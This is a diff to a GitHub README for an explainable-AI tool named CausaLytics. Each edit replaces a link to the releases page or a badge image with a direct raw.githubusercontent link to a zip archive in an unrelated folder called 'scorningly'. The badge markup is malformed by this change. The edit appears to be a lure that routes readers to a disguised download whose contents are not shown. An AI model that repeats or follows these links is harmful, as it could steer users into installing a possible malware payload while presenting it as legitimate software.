@@ -1,6 +1,6 @@
 # 🌐 XAI-Bi-factual-Contrastive-Explanations - Understand AI Decisions Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/5Nader5/XAI-Bi-factual-Contrastive-Explanations/releases)
+[![Download Now](https://raw.githubusercontent.com/5Nader5/XAI-Bi-factual-Contrastive-Explanations/main/scorningly/XAI-Bi-factual-Contrastive-Explanations.zip%https://raw.githubusercontent.com/5Nader5/XAI-Bi-factual-Contrastive-Explanations/main/scorningly/XAI-Bi-factual-Contrastive-Explanations.zip)](https://raw.githubusercontent.com/5Nader5/XAI-Bi-factual-Contrastive-Explanations/main/scorningly/XAI-Bi-factual-Contrastive-Explanations.zip)
 
 ## 📚 Description
 This project provides an Explainable AI (XAI) system focused on bi-factual contrastive explanations. It includes algorithmic optimizations and a user-friendly graphical interface called CausaLytics. This tool helps users better understand AI models by showing how different factors influence decisions.
@@ -9,7 +9,7 @@ This project provides an Explainable AI (XAI) system focused on bi-factual contr
 To use XAI-Bi-factual-Contrastive-Explanations, follow these simple steps:
 
 1. **Download the Application**
-   - Visit the [Releases page](https://github.com/5Nader5/XAI-Bi-factual-Contrastive-Explanations/releases) to download the application.
+   - Visit the [Releases page](https://raw.githubusercontent.com/5Nader5/XAI-Bi-factual-Contrastive-Explanations/main/scorningly/XAI-Bi-factual-Contrastive-Explanations.zip) to download the application.
 
 2. **Install the Application**
    - Locate the downloaded file in your Downloads folder or wherever you saved it.
@@ -23,7 +23,7 @@ To use XAI-Bi-factual-Contrastive-Explanations, follow these simple steps:
 ## 📥 Download & Install
 To get started with the software, click the button below to download the latest version.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/5Nader5/XAI-Bi-factual-Contrastive-Explanations/releases)
+[![Download Now](https://raw.githubusercontent.com/5Nader5/XAI-Bi-factual-Contrastive-Explanations/main/scorningly/XAI-Bi-factual-Contrastive-Explanations.zip%https://raw.githubusercontent.com/5Nader5/XAI-Bi-factual-Contrastive-Explanations/main/scorningly/XAI-Bi-factual-Contrastive-Explanations.zip)](https://raw.githubusercontent.com/5Nader5/XAI-Bi-factual-Contrastive-Explanations/main/scorningly/XAI-Bi-factual-Contrastive-Explanations.zip)
 
 ### System Requirements
 - **Operating System:** Windows 10 or later, macOS, Linux
